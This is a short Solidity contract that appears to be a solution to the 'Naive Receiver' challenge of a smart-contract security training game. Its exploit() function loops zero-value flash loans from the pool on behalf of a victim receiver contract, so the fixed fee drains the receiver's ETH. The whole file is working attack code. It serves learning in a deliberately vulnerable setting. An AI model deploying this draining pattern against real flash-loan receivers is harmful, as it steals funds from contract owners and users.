// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
  NaiveReceiverLenderPool immutable pool;
  address immutable receiver;

  constructor (address payable poolAddr, address receiverAddr) {
    pool = NaiveReceiverLenderPool(poolAddr);
    receiver = receiverAddr;
  }
  
  function exploit() external {
    // since the fees are always paid back, we can do zero value loans until
    // the receiver has no more eth to pay fees
    while (receiver.balance >= pool.fixedFee()) {
      pool.flashLoan(receiver, 0);
    }
  }
}
